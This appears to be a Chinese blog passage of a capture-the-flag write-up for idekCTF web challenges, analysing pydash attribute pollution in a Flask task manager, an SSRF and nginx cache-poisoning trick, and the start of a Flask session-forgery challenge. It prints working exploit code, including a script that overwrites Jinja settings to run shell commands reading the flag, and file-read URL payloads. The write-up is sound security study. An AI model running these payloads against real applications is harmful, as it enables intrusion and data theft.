class="string">&quot;Task marked complete!&quot;</span>&#125;, <span class="number">200</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">type</span>(status) != <span class="built_in">str</span>:</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Your status must be a string!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">        <span class="keyword">if</span> tasks.<span class="built_in">set</span>(task, status):</span><br><span class="line">            <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Task updated!&quot;</span>&#125;, <span class="number">200</span></span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid task name!&quot;</span>&#125;, <span class="number">400</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="comment"># e.</span></span><br><span class="line">        <span class="built_in">print</span>(e)</span><br><span class="line">        <span class="keyword">return</span> &#123;<span class="string">&quot;message&quot;</span>: <span class="built_in">str</span>(e)&#125;, <span class="number">200</span></span><br></pre></td></tr></table></figure><p>那这个tasks对象又是个啥呢？如下2333，很明显给你提示了protected里面存在一些骚东西，看着是很像SSTI</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> pydash</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">TaskManager</span>:</span></span><br><span class="line">    protected = [<span class="string">&quot;set&quot;</span>, <span class="string">&quot;get&quot;</span>, <span class="string">&quot;get_all&quot;</span>, <span class="string">&quot;__init__&quot;</span>, <span class="string">&quot;complete&quot;</span>]</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">__init__</span>(<span class="params">self</span>):</span></span><br><span class="line">        self.<span class="built_in">set</span>(<span class="string">&quot;capture the flag&quot;</span>, <span class="string">&quot;incomplete&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">set</span>(<span class="params">self, task, status</span>):</span></span><br><span class="line">        <span class="keyword">if</span> task <span class="keyword">in</span> self.protected:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        pydash.set_(self, task, status)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">complete</span>(<span class="params">self, task</span>):</span></span><br><span class="line">        <span class="keyword">if</span> task <span class="keyword">in</span> self.protected:</span><br><span class="line">            <span class="keyword">return</span></span><br><span class="line">        pydash.set_(self, task, <span class="literal">False</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get</span>(<span class="params">self, task</span>):</span></span><br><span class="line">        <span class="keyword">if</span> <span class="built_in">hasattr</span>(self, task):</span><br><span class="line">            <span class="keyword">return</span> &#123;task: <span class="built_in">getattr</span>(self, task)&#125;</span><br><span class="line">        <span class="keyword">return</span> &#123;&#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">def</span> <span class="title">get_all</span>(<span class="params">self</span>):</span></span><br><span class="line">        <span class="keyword">return</span> self.__dict__</span><br></pre></td></tr></table></figure><p>同时我们再看看这个<code>set_</code>方法，看doc它支持一些链式调用</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117174708618.png" alt="image-20230117174708618"></p><p>但是也不是无敌的不像我们传统SSTI那样，它只能操作一些属性，而不能调用方法，同时他的操作对象是这个<code>TaskManager</code>类，同时由于代码限制我们只能为其赋值为string类型，这种思想就有点类似js当中原型链污染的感觉了</p><p>同时我们再回到<code>app.py</code>，如果<code>app.env</code>值是<code>yojo</code>，则会向全局模板函数中增加一个eval，通过<code>add_template_global</code>以后我们就能在模板里使用<code>&#123;&#123;eval(payload)&#125;&#125;</code>函数触发</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.before_first_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init</span>():</span></span><br><span class="line">    <span class="keyword">if</span> app.env == <span class="string">&quot;yojo&quot;</span>:</span><br><span class="line">        app.add_template_global(<span class="built_in">eval</span>)</span><br></pre></td></tr></table></figure><p>那么现在重点就是如何通过<code>TaskManager</code>的实例对象获取到我们flask的app对象</p><p>有了这个一方面我们可以设置env，另一方面我们还可以控制before_first_request(毕竟这个只会在第一次加载时运行)</p><p>最终在python的debugger下通过点点点最终找到了这个app对象</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184046914.png" alt="image-20230117184046914"></p><p>其中<code>_got_first_request</code>可以控制<code>@app.before_first_request</code>的运行</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184132874.png" alt="image-20230117184132874"></p><h4 id="非预期读文件"><a href="#非预期读文件" class="headerlink" title="非预期读文件"></a>非预期读文件</h4><p>看看Dockerfile里面</p><figure class="highlight dockerfile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">FROM</span> python:<span class="number">3.8</span>.<span class="number">16</span>-slim-bullseye</span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> apt update &amp;&amp; apt install -y xxd</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> python3 -m pip install flask pydash</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> <span class="built_in">echo</span> <span class="string">&quot;idek&#123;[REDACTED]&#125;&quot;</span> &gt; /flag-$(head -c 16 /dev/urandom | xxd -p).txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> useradd ctf</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">USER</span> ctf</span><br><span class="line"></span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> /app</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> . .</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENTRYPOINT</span><span class="bash"> [<span class="string">&quot;python3&quot;</span>, <span class="string">&quot;app.py&quot;</span>]</span></span><br></pre></td></tr></table></figure><p>最后调用<code>COPY . .</code>复制了所有的文件，看看文件结构这也就以为着把Dockerfile自身也复制进去了2333</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184804829.png" alt="image-20230117184804829"></p><h5 id="姿势1"><a href="#姿势1" class="headerlink" title="姿势1"></a>姿势1</h5><p>可以看到这里有个<code>_static_url_path</code>属性，这是啥目录大家都知道一些静态资源文件都放下面</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184901145.png" alt="image-20230117184901145"></p><p>那么如果我们设置<code>app._static_folder</code> 为<code> /</code> 接着访问 <code>/static/etc/passwd</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;task&quot;:&quot;__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app._static_folder&quot;,&quot;status&quot;:&quot;/&quot;&#125;</span><br></pre></td></tr></table></figure><p>任意文件读</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117185404391.png" alt="image-20230117185404391"></p><h5 id="姿势2"><a href="#姿势2" class="headerlink" title="姿势2"></a>姿势2</h5><p>从app.py当中看</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&lt;path:path&gt;&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">render_page</span>(<span class="params">path</span>):</span></span><br><span class="line">    app._got_first_request = <span class="literal">False</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(<span class="string">&quot;templates/&quot;</span> + path):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;not found&quot;</span>, <span class="number">404</span></span><br><span class="line">    <span class="keyword">return</span> render_template(path)</span><br></pre></td></tr></table></figure><p>如果我们访问<code>/../app.py</code>会怎么样呢，很显然报错了</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117194717091.png" alt="image-20230117194717091"></p><p>我们可以看看flask的实现代码，在<code>jinja2.loaders.FileSystemLoader.get_source</code></p><p>在这里首先通过<code>split_template_path</code>处理路径</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117194944069.png" alt="image-20230117194944069"></p><p>如果我们路径当中带有<code>..</code>可以看到由于和<code>os.path.pardir</code>相等，导致抛出<code>TemplateNotFound</code>异常，也就是不允许跨目录</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195037650.png" alt="image-20230117195037650"></p><p>那如果我们污染了<code>os.path.pardir</code>那么这里就通过了条件，不会拦截</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195359549.png" alt="image-20230117195359549"></p><p>成功实现了跨目录读</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195443235.png" alt="image-20230117195443235"></p><h4 id="预期RCE"><a href="#预期RCE" class="headerlink" title="预期RCE"></a>预期RCE</h4><p>同时这里还有一个<code>jinja_env</code>属性我们可以看到很多有趣的属性比如auto_reload，这里还有识别模板的<code>&#123;%%&#125;</code>以及<code>&#123;&#123;&#125;&#125;</code></p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184230034.png" alt="image-20230117184230034"></p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117184436469.png" alt="image-20230117184436469"></p><h5 id="姿势1-1"><a href="#姿势1-1" class="headerlink" title="姿势1"></a>姿势1</h5><p>那么到了这里如果我们能找到一个py文件，这个py文件里面有<code>eval</code>函数，那是不是我们就能成功rce了呢？这部分我和队友一直没找到，最后出题人提供了答案，在<code>/usr/local/lib/python3.8/turtle.py</code></p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195832333.png" alt="image-20230117195832333"></p><p>那么如果我们控制修改这个模板的标签，再配合污染<code>os.path.pardir</code>,那么是不是就能渲染任意文件顺利RCE了呢</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117195923913.png" alt="image-20230117195923913"></p><p>提供一个出题人的exp</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"></span><br><span class="line">base_url = <span class="string">&quot;http://localhost:1337&quot;</span></span><br><span class="line"><span class="comment">#base_url = &quot;https://task-manager-dc512c530573c0b4.instancer.idek.team&quot;</span></span><br><span class="line"></span><br><span class="line">hijack_start = <span class="string">&quot;&quot;&quot;&#x27;&quot;&quot;&#x27;]:\n            value = &quot;&quot;&quot;</span></span><br><span class="line">hijack_end = <span class="string">&quot;\n&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payloads = &#123;</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.env&quot;</span>: <span class="string">&quot;yolo&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.globals.value&quot;</span>: <span class="string">&quot;__import__(&#x27;os&#x27;).popen(&#x27;cat /flag-*.txt&#x27;).read()&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_start_string&quot;</span>: hijack_start,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app.jinja_env.variable_end_string&quot;</span>: hijack_end,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.os.path.pardir&quot;</span>: <span class="string">&quot;ZZZ&quot;</span>,</span><br><span class="line">        <span class="string">&quot;__class__.__init__.__globals__.__spec__.loader.__init__.__globals__.sys.modules.__main__.app._got_first_request&quot;</span>: <span class="literal">None</span>,</span><br><span class="line">   </span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">overwrite</span>(<span class="params">attr, value</span>):</span></span><br><span class="line">    data = &#123;<span class="string">&quot;task&quot;</span>: attr, <span class="string">&quot;status&quot;</span>: value&#125;</span><br><span class="line">    requests.post(base_url + <span class="string">&quot;/api/manage_tasks&quot;</span>, json=data)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_flag</span>():</span></span><br><span class="line">    url = base_url + <span class="string">&quot;/../../usr/local/lib/python3.8/turtle.py&quot;</span></span><br><span class="line">    s = requests.Session()</span><br><span class="line">    r = requests.Request(method=<span class="string">&#x27;GET&#x27;</span>, url=url)</span><br><span class="line">    prep = r.prepare()</span><br><span class="line">    prep.url = url</span><br><span class="line">    r = s.send(prep)</span><br><span class="line">    flag = re.findall(<span class="string">&#x27;idek&#123;.*&#125;&#x27;</span>, r.text)[<span class="number">0</span>]</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> k, v <span class="keyword">in</span> payloads.items():</span><br><span class="line">    overwrite(k, v)</span><br><span class="line"></span><br><span class="line">get_flag()</span><br></pre></td></tr></table></figure><h5 id="姿势2-1"><a href="#姿势2-1" class="headerlink" title="姿势2"></a>姿势2</h5><p>学习自国外友人<a href="https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager">https://github.com/Myldero/ctf-writeups/tree/master/idekCTF%202022/task%20manager</a></p><p>从编译入手很秀,在生成模板的过程中<code>jinja2.compiler.CodeGenerator.visit_Template</code></p><p>如果我们污染了exported变量那么就可以控制模板的生成</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117204159912.png" alt="image-20230117204159912"></p><p>正好是可以的</p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230117204310119.png" alt="image-20230117204310119"></p><p>之后访问渲染任意模板的时候就能触发RCE，很厉害！</p><h2 id="Proxy-viewer"><a href="#Proxy-viewer" class="headerlink" title="Proxy viewer"></a>Proxy viewer</h2><p>比较有意思的题目，首先看看app.py中关键路由部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">app = Flask(</span><br><span class="line">        __name__,</span><br><span class="line">        static_url_path=<span class="string">&#x27;/static&#x27;</span>,</span><br><span class="line">        static_folder=<span class="string">&#x27;./static&#x27;</span>,</span><br><span class="line">        )</span><br><span class="line"></span><br><span class="line">PREMIUM_TOKEN = os.urandom(<span class="number">32</span>).<span class="built_in">hex</span>()</span><br><span class="line"></span><br><span class="line">limiter = Limiter(app, key_func=get_remote_address)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.after_request</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_headers</span>(<span class="params">response</span>):</span></span><br><span class="line">    response.cache_control.max_age = <span class="number">120</span></span><br><span class="line">    <span class="keyword">return</span> response</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/&#x27;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">index</span>():</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;index.html&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&#x27;/proxy/&lt;path:path&gt;&#x27;</span></span>)</span></span><br><span class="line"><span class="meta">@limiter.limit(<span class="params"><span class="string">&quot;10/minute&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">proxy</span>(<span class="params">path</span>):</span></span><br><span class="line">    remote_addr = request.headers.get(<span class="string">&#x27;X-Forwarded-For&#x27;</span>) <span class="keyword">or</span> request.remote_addr</span><br><span class="line">    is_authorized = request.headers.get(<span class="string">&#x27;X-Premium-Token&#x27;</span>) == PREMIUM_TOKEN <span class="keyword">or</span> remote_addr == <span class="string">&quot;127.0.0.1&quot;</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        page = urlopen(path, timeout=<span class="number">.5</span>)</span><br><span class="line">    <span class="keyword">except</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&#x27;proxy.html&#x27;</span>, auth=is_authorized)</span><br><span class="line">    <span class="keyword">if</span> is_authorized:</span><br><span class="line">        output = page.read().decode(<span class="string">&#x27;latin-1&#x27;</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        output = <span class="string">f&quot;&lt;pre&gt;<span class="subst">&#123;page.headers.as_string()&#125;</span>&lt;/pre&gt;&quot;</span></span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&#x27;proxy.html&#x27;</span>, auth=is_authorized, content=output)</span><br></pre></td></tr></table></figure><p>其中比较关键的是这个<code>/proxy</code>路由，存在一个ssrf漏洞，但是必须<code>is_authorized</code>为<code>true</code>才会返回全部结果，否则只返回响应头</p><p>另一个关键的地方就是nginx的配置，可以看见如果以/static/开头那么就会缓存对应页面内容</p><p>同时可以看到对/开头的所有请求都会增加一个XFF头，因此对于上面的remote_addr我们无法进行伪造，因为nginx对此处理是追加ip，比如(<code>XFF:127.0.0.1,readlip</code>)</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="section">events</span> &#123;</span><br><span class="line">    <span class="attribute">worker_connections</span> <span class="number">1024</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="section">http</span> &#123;</span><br><span class="line">    <span class="attribute">include</span> mime.types;</span><br><span class="line">    <span class="attribute">proxy_cache_path</span> /tmp/nginx keys_zone=my_zone:<span class="number">10m</span> inactive=<span class="number">60m</span> use_temp_path=<span class="literal">off</span>;</span><br><span class="line"></span><br><span class="line">    <span class="section">server</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">listen</span> <span class="number">1337</span>;</span><br><span class="line">        <span class="attribute">client_max_body_size</span> <span class="number">64M</span>;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span> / &#123;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Host $http_host;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="attribute">location</span><span class="regexp"> ^~</span> /static/ &#123;</span><br><span class="line">            <span class="attribute">proxy_pass</span> http://localhost:3000;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> Host $http_host;</span><br><span class="line">            <span class="attribute">proxy_set_header</span> X-Forwarded-For $proxy_add_x_forwarded_for;</span><br><span class="line">    <span class="attribute">proxy_cache</span> my_zone;</span><br><span class="line">    <span class="attribute">add_header</span> X-Proxy-Cache $upstream_cache_status;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里还要用到一个trick就是，urlopen内部处理时会在<code>urllib.request.Request.full_url</code>中去除#后面部分</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@full_url.setter</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">full_url</span>(<span class="params">self, url</span>):</span></span><br><span class="line">  <span class="comment"># unwrap(&#x27;&lt;URL:type://host/path&gt;&#x27;) --&gt; &#x27;type://host/path&#x27;</span></span><br><span class="line">  self._full_url = unwrap(url)</span><br><span class="line">  self._full_url, self.fragment = _splittag(self._full_url)</span><br><span class="line">  self._parse()</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">_splittag</span>(<span class="params">url</span>):</span></span><br><span class="line">    <span class="string">&quot;&quot;&quot;splittag(&#x27;/path#tag&#x27;) --&gt; &#x27;/path&#x27;, &#x27;tag&#x27;.&quot;&quot;&quot;</span></span><br><span class="line">    path, delim, tag = url.rpartition(<span class="string">&#x27;#&#x27;</span>)</span><br><span class="line">    <span class="keyword">if</span> delim:</span><br><span class="line">        <span class="keyword">return</span> path, tag</span><br><span class="line">    <span class="keyword">return</span> url, <span class="literal">None</span></span><br></pre></td></tr></table></figure><p>因此配合这个trick，我们先访问</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:1337/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a</span><br></pre></td></tr></table></figure><p>此时flask会把<code>file%3a///flag.txt%2523/../../../static/a</code>整体当作</p><p>而nginx则会对url做normalize处理，最终导致nginx识别请求为<code>http://127.0.0.1:1337/static/a</code></p><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230119110043007.png" alt="image-20230119110043007"></p><p>再访问即可触发缓存</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://127.0.0.1:1337/proxy/http://127.0.0.1:1337/proxy/file%3a///flag.txt%2523/../../../static/a</span><br></pre></td></tr></table></figure><p><img src="/2023/01/16/year/2023/1/2023IdekCTFWriteup/image-20230119110111302.png" alt="image-20230119110111302"></p><h2 id="SimpleFileServer"><a href="#SimpleFileServer" class="headerlink" title="SimpleFileServer"></a>SimpleFileServer</h2><p>也是python的flask的题目</p><p>可以看到获得flag的条件，那就是成为admin，所以很容易猜测到考点是session伪造，而flask里面这个session的生成通常和变量<code>app.config[&quot;SECRET_KEY&quot;]</code>息息相关</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/flag&quot;</span></span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">flag</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&quot;admin&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;Unauthorized!&quot;</span></span><br><span class="line">    <span class="keyword">return</span> subprocess.run(<span class="string">&quot;./flag&quot;</span>, shell=<span class="literal">True</span>, stdout=subprocess.PIPE).stdout.decode(<span class="string">&quot;utf-8&quot;</span>)</span><br></pre></td></tr></table></figure><p>因此一切的前提是我们能获得这个<code>SECRET_KEY</code></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app.config[<span class="string">&quot;SECRET_KEY&quot;</span>] = os.environ[<span class="string">&quot;SECRET_KEY&quot;</span>]</span><br></pre></td></tr></table></figure><p>而这部分生成在config.py当中</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">SECRET_OFFSET = <span class="number">0</span> <span class="comment"># REDACTED</span></span><br><span class="line">random.seed(<span class="built_in">round</span>((time.time() + SECRET_OFFSET) * <span class="number">1000</span>))</span><br><span class="line">os.environ[<span class="string">&quot;SECRET_KEY&quot;</span>] = <span class="string">&quot;&quot;</span>.join([<span class="built_in">hex</span>(random.randint(<span class="number">0</span>, <span class="number">15</span>)) <span class="keyword">for</span> x <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>)]).replace(<span class="string">&quot;0x&quot;</span>, <span class="string">&quot;&quot;</span>)</span><br></pre></td></tr></table></figure><p>要爆破这部分很明显一是我们需要知道这个<code>time.time()</code>的值，另一个还需要知道<code>SECRET_OFFSET</code>的偏移</p><p>除开注册与登录路由，upoad支持上传一个zip文件并解压到指定目录</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/upload&quot;</span>, methods=[<span class="string">&quot;GET&quot;</span>, <span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">upload</span>():</span></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> session.get(<span class="string">&quot;uid&quot;</span>):</span><br><span class="line">        <span class="keyword">return</span> redirect(<span class="string">&quot;/login&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> request.method == <span class="string">&quot;GET&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;file&quot;</span> <span class="keyword">not</span> <span class="keyword">in</span> request.files:</span><br><span class="line">        flash(<span class="string">&quot;You didn&#x27;t upload a file!&quot;</span>, <span class="string">&quot;danger&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> render_template(<span class="string">&quot;upload.html&quot;</span>)</span><br><span class="line">    </span><br><span class="line">    file = request.files[<span class="string">&quot;file&quot;</span>]</span><br><span class="line">    uuidpath = <span class="built_in">str</span>(uuid.uuid4())</span><br><span class="line">    filename = <span class="string">f&quot;<span class="subst">&#123;DATA_DIR&#125;</span>uploadraw/<span class="subst">&#123;uuidpath&#125;</span>.zip&quot;</span></span><br><span class="line">    